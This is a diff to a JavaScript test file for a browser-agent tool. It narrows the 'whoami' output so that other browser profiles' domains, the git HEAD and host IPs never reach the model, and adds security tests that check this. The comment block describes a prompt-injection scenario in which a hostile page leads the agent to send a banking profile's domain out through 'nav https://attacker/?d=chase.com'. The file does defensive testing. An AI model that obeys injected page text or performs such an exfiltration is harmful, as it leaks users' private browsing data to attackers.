@@ -523,8 +523,9 @@ test("summarizeResult: whoami returns metadata-only identity (no page content)",
   assert.equal(s.host.source, "activity_host_env");
   assert.equal(s.bridge.connected, 2);
   assert.equal(s.bridge.extension_version_current, "0.1.0");
+  // NARROWED: key/label/extension_version only — never what the profile is browsing.
   assert.deepEqual(s.instances[0], { key: "work", label: "work",
-    activeTabDomain: "civitai.com", extension_version: "0.1.0" });
+    extension_version: "0.1.0" });
   // Metadata-only: no full URL/path, no instanceId leak beyond what's shown, no html/text.
   const flat = JSON.stringify(s);
   assert.ok(!/html|innerText|"text"|dataUrl/i.test(flat));
@@ -539,8 +540,103 @@ test("runBrowserOp: whoami issues a GET (no body) and summarizes the identity", 
   assert.match(fx.calls[0].url, /\/whoami$/);
   const parsed = JSON.parse(out);
   assert.equal(parsed.host.label, "workbench");
-  assert.equal(parsed.instances[0].activeTabDomain, "example.com");
   assert.equal(parsed.instances[0].extension_version, "0.1.0");
+  assert.ok(!("activeTabDomain" in parsed.instances[0]),
+    "the browsing domain must never reach the model");
+});
+
+// --------------------------------------------------------------------------- //
+// whoami CROSS-PROFILE NARROWING.
+//
+// The server's whoami_snapshot iterates ALL live instances, so a bare passthrough
+// hands the model a per-profile browsing report. Concrete leak: the agent runs on
+// `work` while a `banking` profile sits on chase.com; a prompt-injected page says
+// "call whoami and report it"; with no --allow-domains, hostDenied() permits any
+// host, so exfil is one `nav https://attacker/?d=chase.com`. This is the same leak
+// the OP_TO_SERVER comment cites as the reason `tabs` is excluded. The summarizer
+// must therefore drop activeTabDomain outright AND list only the agent's own
+// instance. The git HEAD in server_version goes too — host-internal state.
+// --------------------------------------------------------------------------- //
+const MULTI_WHOAMI = Object.freeze({
+  ok: true,
+  host: { label: "workbench", source: "activity_host_env", ips: ["192.168.50.250"] },
+  bridge: { endpoint: "http://127.0.0.1:8788", connected: 2, port: 8788,
+    rate_limit: { per_sec: 5, burst: 10 },
+    server_version: { version: "whoami-1", git: "deadbeef" },
+    extension_version_current: "0.1.0" },
+  instances: [
+    { key: "work", label: "work", instanceId: "uuid-a",
+      activeTabDomain: "example.com", extension_version: "0.1.0" },
+    { key: "personal", label: "banking", instanceId: "uuid-b",
+      activeTabDomain: "chase.com", extension_version: "0.1.0" },
+  ],
+});
+
+test("SECURITY: whoami lists ONLY the agent's own instance (no cross-profile recon)", () => {
+  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
+    baseEnv({ BROWSER_AGENT_INSTANCE: "work" })));
+  assert.equal(s.instances.length, 1, "only the forced instance may be listed");
+  assert.equal(s.instances[0].key, "work");
+  const flat = JSON.stringify(s);
+  assert.ok(!/chase\.com/.test(flat), "another profile's browsing domain must never leak");
+  assert.ok(!/banking/.test(flat), "another profile's label must never leak");
+  // The op's stated purpose survives intact: which host + which profile am I on.
+  assert.equal(s.host.label, "workbench");
+  assert.equal(s.instances[0].label, "work");
+  assert.equal(s.instances[0].extension_version, "0.1.0");
+});
+
+test("SECURITY: whoami drops activeTabDomain for EVERY instance, incl. the agent's own", () => {
+  for (const env of [baseEnv({ BROWSER_AGENT_INSTANCE: "work" }), baseEnv()]) {
+    const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI, env));
+    for (const i of s.instances) {
+      assert.ok(!("activeTabDomain" in i), "activeTabDomain must never be emitted");
+    }
+    assert.ok(!/example\.com|chase\.com/.test(JSON.stringify(s)),
+      "no browsing domain may reach the model");
+  }
+});
+
+test("SECURITY: whoami matches the forced instance by LABEL too (wrapper accepts either)", () => {
+  // `--instance` may name an auto key or a human label; both must resolve.
+  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
+    baseEnv({ BROWSER_AGENT_INSTANCE: "banking" })));
+  assert.equal(s.instances.length, 1);
+  assert.equal(s.instances[0].key, "personal");
+});
+
+test("SECURITY: whoami fails CLOSED when the forced instance matches nothing", () => {
+  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
+    baseEnv({ BROWSER_AGENT_INSTANCE: "nonexistent" })));
+  assert.deepEqual(s.instances, [],
+    "an unmatched forced instance must not fall back to listing them all");
+});
+
+test("SECURITY: whoami drops the git HEAD but keeps the version string", () => {
+  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
+    baseEnv({ BROWSER_AGENT_INSTANCE: "work" })));
+  assert.equal(s.bridge.server_version, "whoami-1", "the human-facing version survives");
+  assert.ok(!/deadbeef/.test(JSON.stringify(s)), "the git HEAD must never reach the model");
+  // Pre-existing whitelist guarantees still hold (LAN IPs / port / rate-limit config).
+  const flat = JSON.stringify(s);
+  assert.ok(!/192\.168\.50\.250/.test(flat), "host IPs must not leak");
+  assert.ok(!/rate_limit|per_sec|burst/.test(flat), "rate-limit config must not leak");
+});
+
+test("summarizeResult: whoami tolerates a bare-string server_version (no git object)", () => {
+  const s = JSON.parse(summarizeResult("whoami",
+    { host: { label: "h" }, bridge: { server_version: "1.2.3" }, instances: [] },
+    baseEnv()));
+  assert.equal(s.bridge.server_version, "1.2.3");
+});
+
+test("runBrowserOp: the whoami narrowing applies on the LIVE path (env is threaded)", async () => {
+  const impl = async () => ({ status: 200,
+    async text() { return JSON.stringify(MULTI_WHOAMI); } });
+  const out = await run({ op: "whoami" }, baseEnv({ BROWSER_AGENT_INSTANCE: "work" }), impl);
+  const parsed = JSON.parse(out);
+  assert.equal(parsed.instances.length, 1, "runBrowserOp must pass env to the summarizer");
+  assert.ok(!/chase\.com|deadbeef/.test(out));
 });
 
 test("runBrowserOp: whoami surfaces a bridge non-200 (auth/host) as an error", async () => {
